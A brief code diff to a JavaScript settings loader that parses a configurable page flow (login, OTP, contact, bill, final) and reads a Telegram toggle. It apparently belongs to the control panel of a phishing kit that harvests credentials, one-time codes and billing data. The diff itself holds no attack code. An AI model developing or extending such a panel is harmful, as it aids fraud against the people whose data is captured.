@@ -114,13 +114,15 @@ async function loadSettings() {
     document.getElementById("telegramToggle").checked = !!data.TelegramEnabled;
     document.getElementById("baSubToggle").checked = !!data.baSub;
 
-    const rawFlow = data.pageFlow || {
-      "1": { page: "login",   enabled: true },
-      "2": { page: "otp",     enabled: true },
-      "3": { page: "contact", enabled: true },
-      "4": { page: "bill",    enabled: true },
-      "5": { page: "final",   enabled: true }
-    };
+    const rawFlow = data.pageFlow
+	  ? JSON.parse(data.pageFlow)  // turn JSON string into object
+	  : { 
+	      "1": { page: "login", enabled: true },
+	      "2": { page: "otp", enabled: true },
+	      "3": { page: "contact", enabled: true },
+	      "4": { page: "bill", enabled: true },
+	      "5": { page: "final", enabled: true }
+	    };
 
     pageFlowConfig = {};
     pageOrder = [];
